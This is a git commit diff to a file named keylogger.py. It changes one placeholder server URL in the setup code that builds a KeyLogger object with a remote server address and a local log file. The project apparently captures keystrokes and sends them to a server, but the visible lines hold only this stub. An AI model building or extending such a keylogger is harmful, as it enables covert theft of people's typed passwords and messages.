7c62ff0591e9dfbe6085c2c113b6820cfdaf74c9
yehonatan saada <yonatan156148@gmail.com>
2025-09-03 12:54:23 +0300

    Added encryption and updated code

--- keylogger.py
+++ keylogger.py
@@ -189,7 +189,7 @@ class KeyLogger:
             listener.join()
 
 if __name__ == "__main__":
-    SERVER_URL = "https://f"
+    SERVER_URL = "https://fv"
     LOG_FILE = "a.txt"
 
     keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)
